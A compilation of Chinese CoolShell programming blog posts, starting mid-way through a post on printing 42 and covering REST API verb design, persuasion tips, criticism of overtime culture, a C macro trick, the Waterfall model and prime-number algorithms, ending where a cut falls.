..>>...<<....>>.....>.<..>.
执行上面的代码，你会得到下面的输出：++++         +++     +[>++++    ++[>+<-][     <]<  -]>   >++    +++     +.-   ---   ---    ---     --.+++++++         +++     +++       .++     +++      +.-     ---    -----.--.再执行上面的代码，会输出：6*7=42如果6*9=42就完美了，就差一步啊……(全文完)**（转载本站文章请注明作者和出处酷 壳 - CoolShell ，请勿用于任何商业用途）**Loading...* * *__趣味问题), 轶事趣闻)__42), Programming), 程序员)##  《如何用最有创造力的方式输出42》的相关评论1.  **无名氏** 说道：2014年03月06日 23:32NB 422.  **king** 说道：2014年03月06日 23:51今天刚学的卡特兰数,C5=42.3.  **yx** 说道：2014年03月07日 00:03“至于后来有人说6 x 9 = 43是基于13进制，原作者说，完全没有这回事，他就是瞎搞的。”   突然短路为啥54的13进制是43， 后面才反映过来是打错字了。
4.  **Ryan42** 说道：2014年03月07日 00:40abcdefg分别对应0123456吧……5.  **june** 说道：2014年03月07日 01:17有点儿意思~6.  **cpmcoder** 说道：2014年03月07日 04:09统称为炫技派7. Pingback： 如何用最有创造力的方式输出42 | | Evolution UnitEvolution Unit8.  **Anonymous** 说道：2014年03月07日 11:11[] 在 js boolean 是 true   ![] 是 false 吧9.  **heyou** 说道：2014年03月07日 13:04想说，这篇文字略水。10.  **Anonymous** 说道：2014年03月07日 14:44@Anonymous   boolean在加法计算时会被转成数字   true->1   false->011.  **kevin** 说道：2014年03月08日 15:40楼主，Python输出的时候，第41行：d(n[0][0], n[0][1], n[1][0], n[1][2]) 应该改为 d(n[0][0], n[0][1], n[1][0], n[1][1])
12.  **zhanxw** 说道：2014年03月09日 09:34Python的代码贴错了。错的是：   >>> p = lambda x: x%2!=0 and True> sum(p(i) for i in range(0,6))对的是：   >>> p = lambda x: x%2!=0 and True<>> sum(p(i) for i in range(0,6))13.  **zhanxw** 说道：2014年03月09日 09:34@zhanxw   对的是：>>> p = lambda x: x%2!=0 and True<>> sum(p(i) for i in range(0,6))14.  **zhanxw** 说道：2014年03月09日 09:36@zhanxw   为什么 “<" 和“x”打在一起会被替换掉？15. Pingback： Python修饰器的函数式编程 | 星达红16.  **eSt0EeWVMK** 说道：2014年03月22日 11:18就是这个范儿,特爽特牛逼17.  **围观天气** 说道：2014年04月17日 09:31人类的好奇心永不停歇
18.  **hilojack** 说道：2014年04月25日 23:32评论数好像少了点啊, 这类文章应该激起大家的好奇心啊. 原来深蓝, google都跟42有关啊.19. Pingback： 谜题的答案和活动的心得体会 | 酷 壳 - CoolShell.cn20.  **just** 说道：2014年08月12日 10:16我也想说这个越界了   @kevin21.  **coding云** 说道：2014年08月21日 14:38这个这个的确很神奇22.  **everburp** 说道：2014年09月09日 03:17python 的lamda运行不了，看不懂>好捉急~23. Pingback： 谜题的答案和活动的心得体会 – 马开东博客24.  **ACMer** 说道：2014年10月09日 06:29还是没太了解为什么是数字 42.25.  **Marser** 说道：2014年10月09日 17:10你回复的好早@ACMer26.  **魔王** 说道：2015年04月06日 09:49@yx   42如果是13进制，换成10进制为 4*13+2=5427.  **childe** 说道：
2015年05月05日 14:290-7-0-7-729的意思是   这里是笔误吧.28.  **foo** 说道：2015年07月24日 14:05最逗的不应该是*对应42吗。。。42： Answer to Everything * ：Match Everything…29. Pingback： 如何重构“箭头型”代码 - 钱胖子# “一把梭：REST API 全用 POST”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn写这篇文章的原因主要还是因为V2EX上的这个贴子，这个贴子中说——> “对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 > https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《我做系统架构的原则》中的“原则五”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。
这篇文章主要分成下面这几个部分：1. 为什么要用不同的HTTP动词？   2. Restful 进行复杂查询   3. 几个主要问题的回应      * POST 更安全吗？     * 全用 POST 可以节省时间沟通少吗？     * 早点回家的正确姿势     * 工作而已，优雅不能当饭吃目录* 为什么要用不同的HTTP动词   * Restful 复杂查询   * 几个主要问题的回应     * 1）为什么API 要Restful，并符合规范？     * 2）为什么“过早优化”不适用于API设计？     * 3）POST 更安全吗？     * 4）全用 POST 可以节省时间减少沟通吗？     * 5）早点回家的正确姿势     * 6）工作而已，优雅不能当饭吃#### 为什么要用不同的HTTP动词编程世界通常来说有两种逻辑：“ **业务逻辑** ” 和 “ **控制逻辑** ”。* **业务逻辑** 。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑   * **控制逻辑** 。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。
网络协议也是一样的，一般来说， **几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。**HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看RFC7231 章节4.2.2 – Idempotent Methods）方法 | 描述 | 幂等   ---|---|---   GET | 用于查询操作，对应于数据库的 `select` 操作 | ✔︎   PUT | 用于所有的信息更新，对应于数据库的 `update `操作 | ✔︎︎   DELETE | 用于更新操作，对应于数据库的 `delete` 操作 | ✔︎︎   POST | 用于新增操作，对应于数据库的 `insert` 操作 | ✘   HEAD | 用于返回一个资源对象的“元数据”，或是用于探测API是否健康 | ✔︎   PATCH | 用于局部信息的更新，对应于数据库的 `update` 操作 | ✘   OPTIONS | 获取API的相关的信息。 | ✔︎
其中，`PUT` 和 `PACTH` 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，`PUT` 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 `PACTH` 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 RFC 5789 ）。当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API `/login` 你觉得这个API应该是 `GET` ，`POST`，`PUT` 还是 `PATCH` ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 `GET` ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 `POST`，而 `/logout` 你可以使用 `DELETE` 。 **这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。**
**另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。** 所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。* `POST` 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的   * `DELETE` 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的   * `PUT` 用于全部数更新，所以，是幂等的。   * `PATCH`用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。
除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：* **缓存** 。通过CDN或是网关对API进行缓存，很显然，我们要在查询`GET` 操作上建议缓存。   * **流控** 。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。   * **路由** 。比如：写请求路由到写服务上，读请求路由到读服务上。   * **权限** 。可以获得更细粒度的权限控制和审计。   * **监控** 。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。   * **压测** 。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。   * ……等等也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但 **是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，`GET` 表示是读操作，`POST`表示是写操作。**#### Restful 复杂查询一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，Microsoft REST API Guidelines，Paypal API Design Guidelines。
* **排序** 。对于结果集的排序，使用 `sort` 关键字，以及 `{field_name}|{asc|desc},{field_name}|{asc|desc}` 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：`GET /admin/companies?sort=rank|asc` 或是 `GET /admin/companies?sort=rank|asc,zip_code|desc`* **过滤** 。对于结果集的过滤，使用 `filter` 关键字，以及 `{field_name} op{value}` 的语法。比如： `GET /companies?category=banking&location=china` 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：`=`，`<`，`>`，`<=`，`>=`，以及三个逻辑操作：`and`，`or`，`not`。（表达式中的一些特殊字符需要做一定的转义，比如：`>=` 转成 `ge`）于是，我们就会有如下的查询表达式：`GET /products?$filter=name eq 'Milk' and price lt 2.55` 查找所有的价柗小于2.55的牛奶。
* **搜索** 。对于相关的搜索，使用 `search` 关键字，以及关键词。如：`GET /books/search?description=algorithm` 或是直接就是全文搜索 `GET /books/search?key=algorithm` 。* **分页** 。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。* 使用`page`和`per_page`代表页码和每页数据量，比如：`GET /books?page=3&per_page=20`。     * **可选** 。上面提到的`page`方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的`ID`、`时间`等信息，以此获取 “ **该ID之前的数据** ” 或 “ **该时刻之前的数据** ”。示例：`GET /news?max_id=23454345&per_page=20` 或 `GET /news?published_before=2011-01-01T00:00:00Z&per_page=20`。
**注意：这里需要注意一下，在理论上来说`GET`是可以带 body 的，但是很多程序的类库或是中间件并不支持 GET 带 body，导致你只能用 POST 来传递参数。这里的原则是：**1. **对于简单的查询，很多参数都设计在 restful API 的路径上了，而 filter/sort/pagination 也不会带来很多的复杂，所以应该使用`GET` **2. **对于复杂的查询来说，可能会有很复杂的查询参数，比如：ElasticSearch 上的`index/_search`里的 DSL，你也应该尽可能的使用 `GET`，而不是`POST` 除非客观条件上不支持`GET`。ElasticSearch 的官方文档里也是这么说的。**> The authors of Elasticsearch prefer using GET for a search request because > they feel that it describes the action—​retrieving information—​better than > the POST verb. （我们推荐使用 GET而不是 POST，因为语义更清楚）However, because GET with a > request body is not universally supported, the search API also accepts POST > requests （除非你的类库或是服务器不支持 GET带参数 ，你再用POST，我们两个都支持） > > **陈皓注：但是在 ElasticSearch 7.11 后，GET 也不支持 body 了。这是 ElasticSearch > 的设计和实现不对应了。**
另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 OData 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。#### 几个主要问题的回应下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。##### 1）为什么API 要Restful，并符合规范？**Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。**##### 2）为什么“过早优化”不适用于API设计？
因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——Microsoft REST API Guidelines，Paypal API Design Guidelines 或是 Google API Design Guide 都是让你好好设计API的不错的 Guidelines.##### 3）POST 更安全吗？不会。很多同学以为 `GET` 的请求数据在URL中，而 `POST` 的则不是，所以以为 `POST` 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 `GET` 请求不安全，但是，`POST` 也没有好到哪里去，在 CSRF 这个最常见的安全问题上，则完全就是针对 `POST` 的。 安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。
另外，* 如果你要 防止你的 `GET` 上有敏感信息，应该加个密，这个跟 `POST`是一样的。   * 如果你要防止 `GET` 会被中间人修改，你应该做一个URL签名。（通常来说， 我们都在 `GET` 上做签名，`POST` 就忘做了）   * 如果你要防止有人发一些恶意链接来 hack 你的用户（传说中的 `GET` 不如 `POST` 安全的一个问题），你应该用 HMAC 之类的认证技术做好认证（参看 HTTP API 认证授权术）。总之，你要明白，`GET` 和 `POST` 的安全问题都一样的，不要有谁比谁更安全，然后你就可以掉以轻心的这样的想法，安全都是要很严肃对待的。##### 4）全用 POST 可以节省时间减少沟通吗？不但不会，反而更糟糕。说这种话的人，我感觉是不会思考问题。* 其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。   * 其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。   * 其三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。
##### 5）早点回家的正确姿势不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：* **把代码组织设计好，有更好的扩展性** 。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？   * **你的代码质量是不错的，有不错的文档和注释** 。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰##### 6）工作而已，优雅不能当饭吃回应两点：其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。其二， **作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量** 。
**希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！**你的工作给你权力，而只有你的行为才会给你尊重（全文完）# 说服他人的5种技巧 – Guy Kawasaki作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn硅谷传奇创业者+精神领袖 Guy Kawasaki最近写了一篇新文章总结了以下5种说服他人的技巧。希望对大家对付老外有帮助。摘要如下：1. **先给予，后索取** (Be the first to give )。研究表明，我们容易被给我们帮过忙的人说服：有些服务员给我们结账的时候带来口香糖，我们一般给他们的小费多些。工作中我们更倾向于给帮助过我们的人更多支持…   2. **不要给对方太多选择** (don’t offer too many choices)：不论是给用户选择，还是给员工的奖励机制，太多的选择经常会给人带来挫折感…   3. **不要以自我为中心辩护** (argue against self-interest)。在说服别人的过程中，信任是最关键的。有时候在大力鼓吹之前承认自己方面的一些小不足可以提高信任感…   4. **失去比得到更有说服力** (losses are more persuasive than gains)。告诉对方如果不接受你的意见或者不买的你的产品会失去什么，要比只是说明他们会得到什么要更能说服人…   5. **让对方觉得自己已经取得了一定进步** (make people feel as if they’ve already made progress toward a goal)。例如以下两种推销洗车会员卡服务的方法，方法2的顾客保持率是方法1的两倍。      1. 洗八次赠一次     2. 洗十次车赠一次，第一次算免费赠送
原文link# “努力就会成功”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn那一年，我加入了某知名公司的某知名部门，在办公室中，我看到了到处都挂着——“努力就会成功”的条幅，这个部门中大多数员工的邮件签名都会有“努力就会成功”，我感到一种热血沸腾的气氛，这是我在多年工作来都没有感受到的，当时挺高兴地能和这样一群人工作，也没多想。直到有一天，我看到这些高级的软件工程师们把自己关在又挤又吵的会议室中，拼命地加班，真是拼命，周一到周日，每天早上10点到凌晨3点甚至凌晨5点，连国庆节都来上班，就在这样的环境和状态下，连续干了三个多月……上线前，QA找到了1000多个bug（你没看错，就是一千多个），最后这个项目用了1年多的时间来返工，本来一个6-8个月的项目，团队被打了鸡血想在3个月内完成，最终却花了近两年的时间来返工……（要知道，我以前在外国公司工作，外国老板看到团队在长时间加班会感到焦虑的，因为加班通常代表着有不好的事情正在发生……）所以对此，我是有点看不懂的，看不懂的是，为什么这么一群聪明的人，放着明亮宽敞的办公桌不用，硬要挤在一个又窄又小又吵又热的小空间里工作，而且要这么透支地写那么重要的很关键的系统级的代码……这就好像，一架在一个小作坊里被人加班加点赶工出来的飞机，谁敢坐啊？！老实说，这群工程师真是很优秀的工程师，他们完全是可以做得更好的……但是却做出了如此蹩脚和糟糕的系统……他们说，这样坐在一起可以做到快速沟通，然而，我觉得这恰恰是一种没有章法的表现。
也是在这家公司，在这个项目烂尾一年前，公司感到了危机，CEO号召全体996，举全公司之力从董事长到下面基层员工对抗外部所谓的威胁，有的部门为了表现，甚至997，然而，在一年后，做出了一个烂得不能再烂的软件，最终以失败告终，很多人包括CEO也因此下课……这是最让我看不懂的一个事了，为什么这么如此成功的公司的高级管理层会做出这样的事情，而且还制定这样的政策……把这么优秀的员工以及公司大把把数以亿计的钞票投入到这种错误的路线上来，而且还拼命地加班…… 他们脑子里在想什么呢？难道他们真的以为，有足够多的钱，足够多的人，然后拼命加班，就能打败对手吗？……#### 你喜欢这句话吗？“努力就会成功”，“加班就会有成就”，“勤劳就会致富”……是这样吗？仔细思考一些，这些话存在严重的逻辑问题，我们在高中的时候学过“充分条件”，“必要条件”和“充要条件”！ **“努力就会成功”这句话，把“努力”说成了“成功”的充要条件，这不就是错的吗？努力只是成功的必要条件之一。** 你在错误的方向或是格局很小的方向上努力，能有用么？你努力地要饭，你努力地当搬运工，你努力地打骚扰电话销卖保险…… 在错误和小格局的方向上努力，你还觉得努力还有用吗？
但是很多人是很喜欢“努力就会成功”这句话，这类人也很喜欢看很多小人物通过自己的努力变成成功人士的励志的故事，为什么这种故事会被很多人喜欢甚至感动。因为这很符合大众的心理诉求，这种诉求其实就是一种只要使力只要拼命了就可以成功的心理诉求， **因为这类人基本上都是能力有限，不知道怎么提升自己的人，当他们看到只要拼命使力就可以成功的观点时，他们就会有共鸣，就会感到，不用学习那些晦涩难懂高级的知识，不用掌握和练习哪些高级技能，自己只需要在低级的事情上拼命和努力，加更多的班和干更多活，自己就会像电影中的那些小人物一样，总有一天会成功的** ……**“努力就会成功，勤劳就会致富”，不但符合那些低级管理者的利益诉求，同样符合那些能力不足不愿意学习和成长的人的诉求。因为，他们混淆了行动与进展，忙碌与多产，他们以为能靠蛮力可以弥补思维上的惰性，靠拼命可以弥补能力上的不足……**喜欢或认同这句话的人基本是能力上有问题的人，这类适合做劳动密集型的事。不信你可以试试看，当一件事的难度超过一定程度的时候，那些聪明的人会找到更省力的方法，而能力上有问题的，还是在那使蛮力。#### 我成长的过程回想我的过去，我在2001年那年被外包到了某银行做开发，标准的9/10/6，封闭开发，就是用C语言在AIX系统里堆一些银行的交易逻辑，老实说，这个过程并没有让我学到什么东西，也没有什么成长，我每天想的就是我要离开这个地方，所以，我在晚上10点以后开始看书学习到11点半，并使用工作环境动手实践书上的代码，一年后，我精读了《TCP/IP详解》《Windows核心编程》《Java编程思想》等书。然后，我找到一份外企业的工作，月薪一下翻了三倍。
在外企不加班，但是当时的外企压力也很大，对代码的质量要求的也很高，来的第二个月，就因为代码写的太差，差点被开掉，所以，为了能够达到更高的标准，我自然也是很努力的，在周末甚至黄金周节假日我哪里都不去，我就去公司，但我不是在公司上班，因为我没有自己的电脑，所以，我只能蹭公司的电脑，这导致办公楼的管理人员经常打电话给我让我帮他在周末的时候管理物业…… **在这家公司是我成长最快的时候，然而，并不是因为我的努力，而是因为有很多比我牛逼的人在Code Review上给我大量的帮助，在项目上帮助我，我的努力学习虽然也有作用，但更多的是高手对我的帮助** 。**再回想一下我以前在职场上的很多关键点，不是因为我加班了，而是因为在某些关键问题上，我跳出来解决了其它人都解决不了的问题** ，我解决了一个网络通信莫名其妙的断掉的问题，我把性能优化了很多倍，我解决了一个不能重现的一个困扰团队3个星期的问题（其实就是大家没有认真读文档），我在入职一个公司的第一天里就为这个公司解决了一个历史遗留问题……在Platform，我每周解决了bug数是全公司的其它人的总和还要多（从不加班），在路透，我带团队优化的系统的性能是全球所有研发中心最高的，在亚马逊，两周打通美国和德国的订单和商品列表系统……我也有失败的时候， **而我失败的时候，总是因为我搞不定事，即便是加班拼命努力也无济于事** ！是的，我的职业生涯的成长，最根本的不是你有多努力，有多勤奋，而是你能搞定很多人搞不定的事！
你不信你可以看看你们公司那些不用加班，就算什么也不干，公司也要花钱养的技术人员，他们的成功一定不是努力和加班加出来的， **你会发现这些人拼的不是谁干的多，而是谁解决的问题更有难** 。**我加班996的时候，从来都不是我成长最快的时候，而我和一群牛人在解决难题的时才是我成长最快的时候。**#### Work Smart2015年因为父亲病危要动手术，所以我不能工作在家照顾父亲。于是我就成为了一个自由职业者，帮很多公司解决一些技术问题，好多都是高并发和系统稳定性的问题，有一些是分布式架构的运维的问题，还有一些是工程管理和企业文化问题……有一些小公司的单体架构在业务上一推广就宕机了，于是把我叫过去，我在生产线上直接re- arch，用一些非常规的手段，1-2天就把性能救过来了…… 还有就是解决一些点状的技术问题，还帮用户做一些design/code review……，有70%工作是真正的按劳取酬，也就是先把问题解决了再谈要收多少钱， **那段时间我出卖的不是我的劳动力，而是我的技能，所以，反而比打工挣得多多了，而且还比较轻闲** ……有时候，我还调侃到，你在大公司里一天写上万行代码，拼命地加班，你信不信，我只用写几百行代码就挣得比你多？ **同样是一个简单的 for-loop 语句，有人写的就值1万元一行，而你写的则一文不值。关键不在于谁写的代码多，关键在于我们解决了什么样的问题** 。你千万不要以为只要付你足够的钱，你就可以996，让你干什么都可以，然而当你自己把自己当成劳动力的时候，你也就只是一个像牲口一样的行事了！
**这就好像算法一样，你那个O(n^2)的递归穷举算法，再怎么样也干不过我的O(n)的动态规划的算法。**现在我拿了投资在创业，一开始帮助各大企业建高并发高可用云化架构的公司，现在还给企业提供金融和营销能力，我跟客户谈业务的时候，基本不是因为我有多加班多努力地做方案，而是我能一针见血地指出用户的问题，帮用户解决问题。我在很多地方都见到阿里、蚂蚁、华为、HP……，一个小创业公司跟他们竞争真的很难，但我知道，要能竞争过这些大公司，这根本就不是能够通过加班996或是拼命努力就能搞定的，我必需要使用更好的方式，所以，除了更好地站在用户的立场，能够给用户制定更符合用户的技术方案之外，我必需做到我的技术方案不比这些大公司的差，而这一点，完全不是加班、努力或是勤奋能出来的，这是需要靠自己的经验、学习能力、归纳思考、和与更多牛人交流才出的来的……当我给某银行CIO介绍完我的分布式系统的方案后，CIO给我微微鞠躬说：“过去一两年，我听过几乎所有国内外产商跟我讲的分布式的方案，你的是我听过的最好的方案！谢谢你！”，当我给某省电信行业公司讲了一下DevOps的方案后，老总对我说：“你们真的是做事的人！”，当用户来问我：“你们的API网关是怎么写的？为什么运行的这么稳定？”……这些话都是让我很心里很暖的话…… **当然，我也有被骂的时候，也有失败的时候，但基本上来说，我无法通过努力工作改善我思维的不足……**
**我们学计算机当程序员最大的福气不是可以到大公司里加班和996，而是我们生活在了第三次工业革命的信息化时代，这才是最大的福气，所以，我们应该努力地提升自己，而不是把自己当劳动力一样的卖了！在这样的一个时代，你要做的不是通过加班和拼命来跪着挣钱，而是通过技能来躺着挣钱……**（全文完）# 伦敦地铁实时图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个网站是关于伦敦地铁实时的运行图：这是个很有意思的网站，其数据是通过伦敦政府发布的TfL API获得的，然后再加上Google Maps的API，于是就有了这样的一个页面。很不错哦。伦敦地铁实时图从这个事情，我们可以得到，英国的信息化的发达，首先地铁部门有实时监控的数据，然后以Web API的方式发布，从这点看来，我国的信息化水平还很差。主要是钱都投到G/F/W上去了。# C技巧：结构体参数转成不定参数作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这段程序是一个C语言的小技巧，其展示了如何把一个参数为结构体的函数转成一个可变参数的函数，其中用到了宏和内建宏“`__VA_ARGS__`”，下面这段程序可以在GCC下正常编译通过：
从上面这段程序，我们可以看到一个叫 myfunc的函数，被func的宏改变了，本来myfunc需要的是一个叫mystru的结构，然而通过宏，我们把struct mystru的这个参数，变成了不定参数列表的一个函数。上面这段程序输出入下，> three: 3   >  hello: 0   >  zero: 0   >  argc: 1   >  untitled: 42虽然，这样的用法并不好，但是你可以从另外一个方面了解一下这世上对C稀奇古怪的用法。 如果你把宏展开后，你就明的为什么了。下面是宏展开的样子：# Waterfall 软件工程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn《Royce, Winston (1970), “Managing the Development of Large Software Systems”, _Proceedings of IEEE WESCON_ **26** (August): 1–9. 》，这篇文章向你说明了软件工程鼻祖“Waterfall”的工程模型，这是40年前的论文，其中的十张插图很有强大，抽出来，让我们来看看什么叫Waterfall软件工程。
首先，让我先看一下小的程序是怎么做的，呵呵，很简单，两步。接下来，就是我们最经典的Waterfall软件工程模型了，用户需求，软件需求，需求分析，设计，编码，测试，运维。为了保证每个步骤都能正确实施，于是，每个步骤之间需要有一定的交互，这是我们所希望的样子。然后，不幸的是，我们总是在测试的时候发现了设计甚至需求的问题，因此，不得不让我们返工。为了解决上面的“返工”问题，我们可以使用下面的几步来解决。第一步，叫Preliminary Design，程序设计先行，确定在进入需求分析之前，我们的概要设计要完整。第二步，我们叫Document Design，书写设计文档，确认我们的设计是完整的。看到了吧，总共6个文档，1）软件需求，2）概要设计，3）接口设计，4）各种最终设计，5）测试设计/计划，6）测试结果。流程开始变得复杂了。第三步，我们叫“Do it Twice”，双保险，把文档了的东西试着预先走一遍，看看能否成为最终产品。第四步，计划，控制和监控测试。哇，流程很乱了。第五步，用户介入，全程review各个环节。好了，问题解决了，让我们看看最终的“无比强大的”——Waterfall软件工程模型！
现在，当你在使用waterfall开发软件的时候，知道为什么痛苦了吧，40年前就已经如此了。下面是《Lone Star Ruby Conference 2010》的一个演讲叫《Real Software Engineer》，没有字幕，但我个人感觉英文很容易听懂，英文好的同学不妨看看。# 打印质数的各种算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn打印质数的算法应该是学习计算机编程的一个经典的问题，在这里想给大家展示一些方法，相信这些方法会对你的编程有一定的启发作用。请你注意几点，* 实际应用和教学应用有很大的差别。   * 最后的那个使用编译时而不是运行时的方法大家可以重点看看。目录* 教科书的示例   * 较好的算法   * 实际应用的算法   * 使用编译时而不是运行时#### 教科书的示例首先，先给一个教科书的示例。下面这个示例应该是教科书（至少是我上大学时的教科学）中算法复杂度最好的例子了。其想法很简单，先写一个判断是否是质数的函数isPrime()，然后从1到n分别调用isPrime()函数来检查。检查是否是质数的算法是核心，其简单的使用从2到n的开根的数作为除数。这样的算法复杂度几乎是O(n*log(n))，看上去不错，但其实很不经济。
#### 较好的算法我们知道，我们的算法如果写成线性算法，也就是O(n)，已经算是不错了，但是最好的是O(Log(n))的算法，这是一个对数级的算法，著名的二分取中（Binary Search）正是O(Log(n))的算法。 **通常来说，O(Log(n))的算法都是以排除法做为手段的** 。所以，找质数的算法完全可以采用排除法的方式。如下所示，这种算法的复杂度是 _O_ _(n(log(logn)))。_**示例：打印30以内的质数**一、初始化如下列表。2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30二、把第一个数（2）取出来，去掉所有可以被2整除的数。2  3     5     7     9    11    13    15    17    19    21    23    25    27    29三、取第二个数（3），去掉所有可以被 3整除的数。2  3     5     7          11    13          17    19          23    25          29
